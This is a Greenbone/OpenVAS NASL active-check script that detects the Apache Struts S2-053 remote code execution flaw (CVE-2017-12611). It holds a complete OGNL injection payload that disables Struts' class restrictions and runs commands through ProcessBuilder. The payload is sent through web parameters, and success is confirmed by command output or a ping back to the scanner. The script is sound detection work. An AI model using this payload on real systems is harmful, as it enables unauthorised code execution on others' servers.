if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.108243" );
	script_version( "2021-09-21T12:53:25+0000" );
	script_cve_id( "CVE-2017-12611" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-09-21 12:53:25 +0000 (Tue, 21 Sep 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-08-12 21:15:00 +0000 (Mon, 12 Aug 2019)" );
	script_tag( name: "creation_date", value: "2017-09-11 12:00:00 +0200 (Mon, 11 Sep 2017)" );
	script_name( "Apache Struts Security Update (S2-053) - Active Check" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 8080 );
	script_exclude_keys( "Settings/disable_cgi_scanning", "global_settings/disable_generic_webapp_scanning" );
	script_xref( name: "URL", value: "https://cwiki.apache.org/confluence/display/WW/S2-053" );
	script_xref( name: "Advisory-ID", value: "S2-053" );
	script_xref( name: "URL", value: "https://cwiki.apache.org/confluence/display/WW/S2-058" );
	script_xref( name: "Advisory-ID", value: "S2-058" );
	script_tag( name: "summary", value: "Apache Struts is prone to a remote code execution
  (RCE) vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the
  response.

  NOTE: This script needs to check every parameter of a web application with various
  crafted requests. This is a time-consuming process and this script won't run by default.
  If you want to check for this vulnerability please enable 'Enable generic web
  application scanning' within the script preferences of the VT 'Global variable settings
  (OID: 1.3.6.1.4.1.25623.1.0.12288)'." );
	script_tag( name: "impact", value: "Successfully exploiting this issue may allow an
  attacker to execute arbitrary code in the context of the affected application." );
	script_tag( name: "affected", value: "Apache Struts 2.0.0 through 2.3.33 and 2.5 through
  2.5.10.1." );
	script_tag( name: "solution", value: "Update to version 2.3.34, 2.5.12 or later." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("url_func.inc.sc");
if(http_is_cgi_scan_disabled() || get_kb_item( "global_settings/disable_generic_webapp_scanning" )){
	exit( 0 );
}
port = http_get_port( default: 8080 );
host = http_host_name( dont_add_port: TRUE );
cgis = http_get_kb_cgis( port: port, host: host );
if(!cgis){
	exit( 0 );
}
for cgi in cgis {
	cgiArray = split( buffer: cgi, sep: " ", keep: FALSE );
	cmds = exploit_commands();
	for cmd in keys( cmds ) {
		c = "{'" + cmds[cmd] + "'}";
		ex = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):" + "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com." + "opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses()." + "clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder(" + c + "))." + "(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";
		urls = http_create_exploit_req( cgiArray: cgiArray, ex: urlencode( str: ex ) );
		for url in urls {
			req = http_get_req( port: port, url: url );
			buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
			if(egrep( pattern: cmd, string: buf )){
				report = "It was possible to execute the command `" + cmds[cmd] + "` on the remote host.\n\nRequest:\n\n" + req + "\n\nResponse:\n\n" + buf;
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
for cgi in cgis {
	if( os_host_runs( "Windows" ) == "yes" ){
		cleancmd = "ping -n 3 " + this_host();
		pingcmd = "\"ping\",\"-n\",\"3\",\"" + this_host() + "\"";
		win = TRUE;
	}
	else {
		vtstrings = get_vt_strings();
		check = vtstrings["ping_string"];
		pattern = hexstr( check );
		cleancmd = "ping -c 3 -p " + pattern + " " + this_host();
		pingcmd = "\"ping\",\"-c\",\"3\",\"-p\",\"" + pattern + "\",\"" + this_host() + "\"";
	}
	c = "{" + pingcmd + "}";
	ex = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):" + "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com." + "opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses()." + "clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder(" + c + "))." + "(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";
	cgiArray = split( buffer: cgi, sep: " ", keep: FALSE );
	urls = http_create_exploit_req( cgiArray: cgiArray, ex: urlencode( str: ex ) );
	for url in urls {
		req = http_get_req( port: port, url: url );
		res = send_capture( socket: soc, data: req, timeout: 2, pcap_filter: NASLString( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );
		if(!res){
			continue;
		}
		data = get_icmp_element( icmp: res, element: "data" );
		if(data && ( win || ContainsString( data, check ) )){
			close( soc );
			report = "It was possible to execute the command `" + cleancmd + "` on the remote host.\n\nRequest:\n\n" + req + "\n\nResponse:\n\n" + data;
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
close( soc );
exit( 0 );

